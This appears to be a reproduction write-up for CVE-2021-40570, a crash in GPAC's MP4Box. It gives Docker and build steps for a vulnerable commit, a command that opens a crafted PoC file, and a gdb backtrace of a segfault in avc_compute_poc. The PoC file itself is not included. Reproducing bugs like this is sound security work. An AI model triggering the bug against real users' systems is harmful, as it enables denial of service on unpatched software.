### CVE-2021-40570

### PoC Links
[Github.com](https://github.com/gpac/gpac/issues/1899)

### Docker Container Run Command
```shell
docker build -t cve-2021-40570-poc .
docker run --privileged --security-opt seccomp=unconfined -itd --name CVE-2021-40570-POC cve-2021-40570-poc
docker exec -it CVE-2021-40570-POC /bin/bash
```

### PoC Reproduce Command
```shell
# Preparing the initial environment
apt-get update -y
apt-get install git -y

# Configure local SSH for Github and clone the repository. (ssh-keygen)
cd /poc
git clone git@github.com:gpac/gpac.git

# Rollback to the vulnerable version.
cd gpac/
git reset --hard 592ba2689a3f2fc787371eda490fde4f84e60315

# Install the compilation and installation dependencies.
apt install gcc make gdb zlib1g-dev pkg-config clang libtool-bin build-essential llvm-dev libunwind-dev -y

# Configure, compile, and install.
./configure --static-bin --enable-debug
make
make install

# Open the poc file.
MP4Box -info /poc/mp4box-seg-overflow_avc_compute_poc5988
```

### Description
Observed that:
```shell
root@4497caebf03c:/poc# gdb MP4Box
GNU gdb (Ubuntu 12.1-0ubuntu1~22.04) 12.1
Copyright (C) 2022 Free Software Foundation, Inc.
...

For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from MP4Box...
(gdb) r  -info /poc/mp4box-seg-overflow_avc_compute_poc5988
Starting program: /usr/local/bin/MP4Box -info /poc/mp4box-seg-overflow_avc_compute_poc5988
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/aarch64-linux-gnu/libthread_db.so.1".
[Core] exp-golomb read failed, not enough bits in bitstream !
[Core] exp-golomb read failed, not enough bits in bitstream !
[Core] exp-golomb read failed, not enough bits in bitstream !
[Core] exp-golomb read failed, not enough bits in bitstream !
[Core] exp-golomb read failed, not enough bits in bitstream !
[avc-h264] offset_for_ref_frame overflow from poc_cycle_length
[AVC|H264] Warning: Error parsing NAL unit
[AVC|H264] Error parsing Sequence Param Set
[Core] exp-golomb read failed, not enough bits in bitstream !
[Core] exp-golomb read failed, not enough bits in bitstream !
[Core] exp-golomb read failed, not enough bits in bitstream !
[Core] exp-golomb read failed, not enough bits in bitstream !

Program received signal SIGSEGV, Segmentation fault.
0x000000000064ecdc in avc_compute_poc (si=0xffffffff6770) at media_tools/av_parsers.c:5988
5988                            expected_delta_per_poc_cycle += si->sps->offset_for_ref_frame[i];
(gdb) bt
#0  0x000000000064ecdc in avc_compute_poc (si=0xffffffff6770) at media_tools/av_parsers.c:5988
#1  0x000000000064f644 in gf_avc_parse_nalu (bs=0xe1a6f0, avc=0xe29470) at media_tools/av_parsers.c:6191
#2  0x000000000087b434 in naludmx_parse_nal_avc (ctx=0xe28e90, data=0xe04c4a "Cd\234\316sh\350", size=15, nal_type=3,
skip_nal=0xffffffff686c, is_slice=0xffffffff6878, is_islice=0xffffffff687c) at filters/reframe_nalu.c:2348
#3  0x000000000087cd84 in naludmx_process (filter=0xe28b60) at filters/reframe_nalu.c:2874
#4  0x0000000000746114 in gf_filter_process_task (task=0xe03840) at filter_core/filter.c:2441
#5  0x00000000007370a0 in gf_fs_thread_proc (sess_thread=0xdffec0) at filter_core/filter_session.c:1640
#6  0x000000000073792c in gf_fs_run (fsess=0xdffe30) at filter_core/filter_session.c:1877
#7  0x00000000006620f0 in gf_media_import (importer=0xffffffff74b0) at media_tools/media_import.c:1178
#8  0x000000000042a864 in convert_file_info (inName=0xfffffffff904 "/poc/mp4box-seg-overflow_avc_compute_poc5988", trackID=0)
at fileimport.c:128
#9  0x000000000041458c in mp4boxMain (argc=3, argv=0xfffffffff6e8) at main.c:5925
#10 0x0000000000417394 in main (argc=3, argv=0xfffffffff6e8) at main.c:6455
```



